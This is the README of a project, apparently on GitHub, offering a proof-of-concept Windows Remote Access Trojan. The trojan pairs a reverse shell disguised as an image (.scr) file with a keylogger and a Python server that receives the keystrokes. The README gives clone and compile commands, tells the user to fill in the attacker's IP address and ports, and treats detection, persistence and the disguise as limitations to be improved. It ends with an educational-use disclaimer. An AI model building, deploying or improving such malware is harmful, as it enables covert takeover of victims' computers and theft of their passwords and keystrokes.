## Remote Access Trojan Malware (RAT) - WINDOWS ONLY

Demo of program: https://youtu.be/RcpXn2kfrlI?si=ohb-wma8S2qRLFxM 

This is a POC of a RAT malware, consisting of a reverse shell and a keylogger. The malware is concealed within an image file (.scr) that, when opened, displays the image as expected while simultaneously launching a remote PowerShell session in the background.
From this reverse shell we can install the rest of our program (keylogger), and make it run in the background of the taget computer. 

This is a proof of concept RAT malware, in its current state it consists of 3 components: 
1) Reverse Shell: reverseShell.c 
2) Keylogger: keylogger.cpp + .dll dependencies
3) Backend receiving keylogging data: serversocket.py

### Installing:
1) git clone https://github.com/HaakonWiland/RATIRL.git
2) Fill in IP ADDRESS and port numbers in reverseShell.c and keylogger.cpp
3) ! Include YOUR LOCAL ABSOLUTE PATH for the network.h file in the top of keylogger.cpp ! (Plan to fix this in the future)
4) Compile reverseShell.exe:  g++ reverseShell.c -o reverseShell.exe -lws2_32 -mwindows
5) Compile keylogger.exe: make
(Should be enough to just run 'make', but Makefiles are wierd so if it fails to compile consider changing some of the path's of the .dll files.)

### Limitations: 
As this project is currently a proof of concept (POC), it has several limitations:
1) Detection by Windows Defender: Windows Defender will detect and remove the reverse shell if the firewalls are set to the default user settings.
2) Lack of Persistence: Neither the reverse shell nor the keylogger is persistent. This means the target can simply reboot their PC to stop the program from running.
3) Network Configuration: The program has only been tested on a Local Area Network (LAN). Adjustments may be required for it to function correctly in different network configurations.
4) The "Trojan", in Remote Access Trojan: Hiding the malware in an image file is a cheap trick. For the program work in a real scenario, it should be hidden another way.  

### Disclaimer:

This project is intended for educational purposes only. Unauthorized use of this software to compromise or control systems without permission is illegal and unethical. Always obtain explicit consent before testing or deploying this software on any system.
